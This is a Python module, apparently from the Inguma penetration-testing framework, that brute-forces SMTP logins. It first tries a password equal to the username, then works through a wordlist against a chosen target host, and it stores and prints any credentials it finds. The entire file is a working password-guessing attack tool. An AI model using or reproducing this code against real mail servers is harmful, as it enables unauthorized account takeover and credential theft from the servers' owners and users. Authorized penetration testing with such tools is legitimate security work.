##      CSmtpBrute.py
#
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

import sys
import time
import socket
import smtplib

from lib.module import CIngumaBruteModule

name = "brutesmtp"
brief_description = "A simple SMTP brute force tool"
type = "brute"

class CSmtpBrute(CIngumaBruteModule):

	host = ""
	port = 0
	waitTime = 0
	timeout = 1
	exploitType = 3
	services = ""
	results = {}
	user = ""
	port = 0
	qssl = False

	def __init__(self):
		self.smtp = None
		self.tid = None
		self.pwd = ''
		self.share = None

	def help(self):
		self.gom.echo("target = <target host or network>")
		self.gom.echo("port = <port>")
		self.gom.echo("user = <username>")

	def brute_force(self):
		self.smtp = smtplib.SMTP(self.target, self.port)
		userList = [self.user, ]
		if self.port == 0:
			self.port = 25

		socket.setdefaulttimeout(self.timeout)

		try:
			sys.stdout.write("Trying " + self.user + "/" + self.user)
			self.login(self.user, self.user)
			self.add_data_to_kb(self.target + "_passwords", self.user + "/" + self.user)
			self.results[self.user] = self.user
			return True
		except:
			# Well, first try :)
			self.close()

		for user in userList:
			for passwd in self.get_password_list(self.dict['base_path']):
				time.sleep(self.waitTime)
				try:
					passwd = passwd.replace("\n", "").replace("\r", "")
					sys.stdout.write("\b"  * 80 + "Trying " + user + "/" + passwd + "...")
					sys.stdout.flush()
					self.login(user, passwd)
					self.add_data_to_kb(self.target + "_passwords", self.user + "/" + passwd)
					self.results[user] = passwd

					return True
				except KeyboardInterrupt:
					self.gom.echo("Aborted.")
					return False
				except:
					self.gom.echo(sys.exc_info()[1])
					self.close()

		return False

	def run(self):
		if self.target == "":
			self.gom.echo("No target specified")
			return False

		if self.port == 0 or self.port is None:
			self.port = 25

		if self.user == "":
			self.gom.echo("No user specified")
			return False

		self.brute_force()
		return True

	def print_summary(self):
		for x in self.results:
			self.gom.echo(x + "/" + self.results[x] + "\n")

	def login(self, username, password):
		self.smtp = smtplib.SMTP()
		x = self.smtp.connect(self.target, self.port)

		if x[1].lower().find("esmtp") > -1:
			self.smtp.ehlo()
		else:
			self.smtp.helo()

		if self.ssl:
			self.smtp.starttls()
			self.smtp.ehlo()

		self.smtp.login(username, password)

	def login_hash(self,username, lmhash, nthash):
		self.gom.echo("Not yet applicable")

	def logoff(self):
		if not self.smtp:
			self.gom.echo("Open a connection first.")

		self.smtp.close()
		self.smtp = None

	def close(self):
		if not self.smtp:
			self.gom.echo("Open a connection first.")

		#self.smtp.quit();
